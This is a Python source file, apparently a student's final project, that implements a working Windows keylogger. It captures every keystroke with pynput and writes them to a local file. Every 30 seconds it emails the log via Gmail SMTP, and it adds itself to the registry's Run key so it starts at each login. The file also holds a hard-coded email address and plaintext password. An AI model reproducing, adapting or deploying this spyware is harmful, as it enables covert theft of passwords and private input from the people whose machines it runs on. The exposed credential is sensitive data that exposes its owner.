import pynput.keyboard as keyboard # type: ignore
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import os
import threading
import winreg as reg
import sys


destiny = 'C:/Users/susan/Documents/Proyecto_Final/keylogs.txt'


# Configuración del correo
sender_email = "proyectokeyloggeralgmal@gmail.com"
receiver_email = "proyectokeyloggeralgmal@gmail.com"  # Aquí pones el mismo o otro correo
password = "susu@11082003"

# Función para procesar el archivo, limpiar y enviar por correo
def send_email():
    while True:
        # Leer el archivo con los keylogs
            if os.path.getsize(destiny) > 0:  # Verifica si el archivo tiene contenido
                # Leer el archivo con los keylogs
                with open(destiny, 'r') as file:
                    data = file.read()

                data = data.replace('\n', ' ').strip()

                # Configurar el correo electrónico
                msg = MIMEMultipart()
                msg['From'] = sender_email
                msg['To'] = receiver_email
                msg['Subject'] = 'Keylogger Logs'

                # Agregar el contenido del archivo al cuerpo del correo
                msg.attach(MIMEText(data, 'plain'))

                # Conectar al servidor de correo y enviar
                try:
                    server = smtplib.SMTP('smtp.gmail.com', 587)
                    server.starttls()
                    server.login(sender_email, password)
                    text = msg.as_string()
                    server.sendmail(sender_email, receiver_email, text)
                    server.quit()
                    print("Correo enviado con éxito")

                    # Limpiar el archivo después de enviar el correo
                    open(destiny, 'w').close()  # Vacia el archivo
                except Exception as e:
                    print(f"Error al enviar el correo: {e}")
            else:
                print("El archivo está vacío. No se envió el correo.")

            time.sleep(30)



def add_to_registry():
    # Ruta del ejecutable de tu keylogger (se utiliza el path del script o .exe)
    exe_path = os.path.join(os.getcwd(), sys.argv[0])

    # Ruta del Registro de Windows para ejecutar programas al iniciar
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"

    # Abre la clave del registro para escritura
    try:
        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_WRITE)
        # Agrega una nueva entrada en el registro para ejecutar el keylogger
        reg.SetValueEx(registry_key, "MyKeylogger", 0, reg.REG_SZ, exe_path)
        # Cierra el registro
        reg.CloseKey(registry_key)
        print(f"Keylogger añadido al inicio de sesión: {exe_path}")
    except Exception as e:
        print(f"Error al agregar al registro: {e}")

        
def on_press(key):
    logging.basicConfig(filename=destiny, level=logging.DEBUG, format='%(message)s')
    try:
        if key == keyboard.Key.space:
            logging.log(10, ' ')
            print('Key: Space')
        elif key == keyboard.Key.enter:
            logging.log(10, '\n')
            print('Key: Enter')
        elif key == keyboard.Key.backspace:
            with open(destiny, 'r') as file:
                data = file.read()
            data = data[:-1]  # Eliminar el último carácter
            with open(destiny, 'w') as file:
                file.write(data)
        else:
            logging.log(10, key.char)
            print('Key: {0}'.format(key))
    except AttributeError:
        pass


def start():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

threading.Thread(target=send_email).start()

add_to_registry()
start()

